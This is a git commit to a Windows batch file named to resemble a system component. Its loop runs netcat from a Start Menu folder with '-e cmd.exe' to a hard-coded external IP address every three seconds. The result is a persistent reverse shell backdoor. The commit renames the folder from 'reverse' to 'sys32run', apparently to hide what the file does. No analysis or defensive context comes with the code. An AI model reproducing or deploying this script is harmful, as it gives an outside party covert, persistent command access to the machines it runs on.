4c8800c034961e2795b4c992af6cebb285499bed
strongpapazola <48545591+strongpapazola@users.noreply.github.com>
2020-07-16 14:52:51 +0700

    Update sys32run2.bat

--- sys32run2.bat
+++ sys32run2.bat
@@ -1,4 +1,4 @@
 :a
 timeout /t 3 /nobreak
-"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\nc.exe" 117.53.47.252 1234 -e cmd.exe
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run\nc.exe" 117.53.47.252 1234 -e cmd.exe
 goto a
